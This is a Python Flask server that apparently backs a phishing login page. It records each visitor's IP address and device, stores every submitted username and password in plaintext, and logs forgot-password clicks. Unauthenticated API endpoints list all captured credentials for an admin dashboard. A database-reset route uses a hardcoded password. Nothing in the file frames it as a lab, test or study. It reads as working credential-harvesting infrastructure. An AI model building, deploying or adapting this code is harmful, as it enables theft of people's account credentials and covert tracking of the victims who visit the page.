from flask import Flask, request, jsonify, send_from_directory
import sqlite3
from datetime import datetime

app = Flask(__name__)
DB_PATH = "login_credentials.db"

# ─────────────────────────────────────────────────────────────
#  DATABASE SETUP
# ─────────────────────────────────────────────────────────────
def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    conn = get_db()
    c = conn.cursor()

    # Legacy table — kept for backward compatibility
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            username TEXT PRIMARY KEY,
            password TEXT NOT NULL
        )
    """)

    # SECTION 1: Login Details — every submit gets its own row
    c.execute("""
        CREATE TABLE IF NOT EXISTS login_details (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            username      TEXT NOT NULL,
            password      TEXT NOT NULL,
            submitted_time TEXT NOT NULL
        )
    """)

    # SECTION 2: Visitor Logs — every page visit gets its own row
    c.execute("""
        CREATE TABLE IF NOT EXISTS visits (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address  TEXT NOT NULL,
            device_info TEXT NOT NULL,
            visit_time  TEXT NOT NULL
        )
    """)

    # SECTION 3: Forgot Password Logs — every click gets its own row
    c.execute("""
        CREATE TABLE IF NOT EXISTS forgot_password_logs (
            id          INTEGER PRIMARY KEY AUTOINCREMENT,
            ip_address  TEXT NOT NULL,
            device_info TEXT NOT NULL,
            clicked_time TEXT NOT NULL
        )
    """)

    conn.commit()
    conn.close()

init_db()

# ─────────────────────────────────────────────────────────────
#  STATIC FILE ROUTES
# ─────────────────────────────────────────────────────────────
@app.route("/style.css")
def css():
    return send_from_directory(".", "style.css")

@app.route("/script.js")
def js():
    return send_from_directory(".", "script.js")

# ─────────────────────────────────────────────────────────────
#  HOMEPAGE — logs every visit automatically
# ─────────────────────────────────────────────────────────────
@app.route("/")
def home():
    try:
        # Support proxies / Render's load balancer
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()

        device      = request.user_agent.string or "Unknown"
        visit_time  = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = get_db()
        conn.execute(
            "INSERT INTO visits (ip_address, device_info, visit_time) VALUES (?, ?, ?)",
            (ip, device, visit_time)
        )
        conn.commit()
        conn.close()
    except Exception:
        pass  # never crash the main page due to logging

    return send_from_directory(".", "index.html")

# ─────────────────────────────────────────────────────────────
#  SAVE LOGIN — stores credential in both tables
# ─────────────────────────────────────────────────────────────
@app.route("/save-login", methods=["POST"])
def save_login():
    try:
        data           = request.get_json()
        username       = data["username"]
        password       = data["password"]
        submitted_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = get_db()

        # New detailed log (all submissions, newest first)
        conn.execute(
            "INSERT INTO login_details (username, password, submitted_time) VALUES (?, ?, ?)",
            (username, password, submitted_time)
        )

        # Legacy users table (upsert, keeps one row per username)
        conn.execute(
            "INSERT OR REPLACE INTO users (username, password) VALUES (?, ?)",
            (username, password)
        )

        conn.commit()
        conn.close()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ─────────────────────────────────────────────────────────────
#  ADMIN DASHBOARD
# ─────────────────────────────────────────────────────────────
@app.route("/admin")
def admin():
    return send_from_directory(".", "admin.html")

# Legacy endpoint — kept for compatibility
@app.route("/api/credentials")
def get_credentials():
    conn = get_db()
    rows = conn.execute("SELECT username, password FROM users").fetchall()
    conn.close()
    return jsonify([{"username": r[0], "password": r[1]} for r in rows])

# Section 1: login details (newest first)
@app.route("/api/login-details")
def get_login_details():
    conn = get_db()
    rows = conn.execute(
        "SELECT id, username, password, submitted_time FROM login_details ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return jsonify([
        {"id": r[0], "username": r[1], "password": r[2], "submitted_time": r[3]}
        for r in rows
    ])

# Section 2: visitor logs (newest first)
@app.route("/api/visits")
def get_visits():
    conn = get_db()
    rows = conn.execute(
        "SELECT id, ip_address, device_info, visit_time FROM visits ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return jsonify([
        {"id": r[0], "ip_address": r[1], "device_info": r[2], "visit_time": r[3]}
        for r in rows
    ])

# Section 3: forgot password logs (newest first)
@app.route("/api/forgot-logs")
def get_forgot_logs():
    conn = get_db()
    rows = conn.execute(
        "SELECT id, ip_address, device_info, clicked_time FROM forgot_password_logs ORDER BY id DESC"
    ).fetchall()
    conn.close()
    return jsonify([
        {"id": r[0], "ip_address": r[1], "device_info": r[2], "clicked_time": r[3]}
        for r in rows
    ])

# Log a forgot-password link click
@app.route("/log-forgot", methods=["POST"])
def log_forgot():
    try:
        ip = request.headers.get("X-Forwarded-For", request.remote_addr)
        if ip and "," in ip:
            ip = ip.split(",")[0].strip()
        device       = request.user_agent.string or "Unknown"
        clicked_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        conn = get_db()
        conn.execute(
            "INSERT INTO forgot_password_logs (ip_address, device_info, clicked_time) VALUES (?, ?, ?)",
            (ip, device, clicked_time)
        )
        conn.commit()
        conn.close()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ─────────────────────────────────────────────────────────────
#  RESET DATABASE
# ─────────────────────────────────────────────────────────────
@app.route("/reset-db", methods=["POST"])
def reset_db():
    try:
        data = request.get_json()
        if data.get("password") != "564938":
            return jsonify({"success": False, "error": "Invalid password"}), 403
            
        conn = get_db()
        # Clear all tables
        conn.execute("DELETE FROM login_details")
        conn.execute("DELETE FROM users")
        conn.execute("DELETE FROM visits")
        conn.execute("DELETE FROM forgot_password_logs")
        
        # Reset sqlite_sequence to reset autoincrement ids
        conn.execute("DELETE FROM sqlite_sequence WHERE name='login_details'")
        conn.execute("DELETE FROM sqlite_sequence WHERE name='visits'")
        conn.execute("DELETE FROM sqlite_sequence WHERE name='forgot_password_logs'")
        
        conn.commit()
        conn.close()
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)